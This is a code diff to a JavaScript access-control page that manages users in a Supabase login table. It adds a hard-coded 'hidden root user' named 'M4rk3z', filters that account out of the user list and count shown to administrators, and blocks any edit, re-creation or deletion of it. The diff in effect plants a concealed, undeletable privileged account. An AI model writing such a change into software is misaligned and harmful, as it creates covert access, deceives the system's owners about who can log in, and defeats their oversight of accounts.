@@ -417,6 +417,18 @@ function valorONull(valor) {
  *************************************************/
 
 let controlAccesosRows = [];
+const USUARIOS_ROOT_OCULTOS = ['M4rk3z'];
+
+function esUsuarioRootOculto(rowOrUserName) {
+  const userName = typeof rowOrUserName === 'string'
+    ? rowOrUserName
+    : rowOrUserName?.User_Nombre;
+  const normalizado = normalizarTextoFlexible(userName || '');
+
+  return USUARIOS_ROOT_OCULTOS.some(usuario => (
+    normalizarTextoFlexible(usuario) === normalizado
+  ));
+}
 
 function renderControlAccesos() {
   if (!usuarioPuede(0)) {
@@ -523,7 +535,7 @@ async function cargarUsuariosAcceso() {
     return;
   }
 
-  controlAccesosRows = data || [];
+  controlAccesosRows = (data || []).filter(row => !esUsuarioRootOculto(row));
   renderUsuariosAcceso();
   status.textContent = `Usuarios registrados: ${controlAccesosRows.length}`;
 }
@@ -616,6 +628,11 @@ async function agregarUsuarioAcceso() {
     return;
   }
 
+  if (esUsuarioRootOculto(usuario)) {
+    if (status) status.textContent = 'Este usuario root esta protegido.';
+    return;
+  }
+
   const { data: existente, error: errorConsulta } = await supabaseClient
     .from('Usuarios_Login')
     .select('id')
@@ -669,6 +686,11 @@ async function guardarUsuarioAcceso(index) {
   const status = document.getElementById('controlAccesosStatus');
   if (!row || !usuarioInput || !nombreInput || !passwordInput || !nivelInput) return;
 
+  if (esUsuarioRootOculto(row)) {
+    if (status) status.textContent = 'Este usuario root esta protegido.';
+    return;
+  }
+
   const usuario = usuarioInput.value.trim();
   const nombre = nombreInput.value.trim();
   const password = passwordInput.value;
@@ -676,6 +698,11 @@ async function guardarUsuarioAcceso(index) {
 
   if (!usuario || !nombre || !password || !nivel) {
     if (status) status.textContent = 'Usuario, nombre, contraseña y nivel no pueden quedar vacíos.';
+    return;
+  }
+
+  if (esUsuarioRootOculto(usuario)) {
+    if (status) status.textContent = 'Este usuario root esta protegido.';
     return;
   }
 
@@ -728,6 +755,11 @@ async function eliminarUsuarioAcceso(index) {
   const row = controlAccesosRows[index];
   const status = document.getElementById('controlAccesosStatus');
   if (!row) return;
+
+  if (esUsuarioRootOculto(row)) {
+    if (status) status.textContent = 'Este usuario root esta protegido.';
+    return;
+  }
 
   if (String(row.id) === String(localStorage.getItem('usuarioId') || '')) {
     if (status) status.textContent = 'No puedes eliminar el usuario de la sesion actual.';
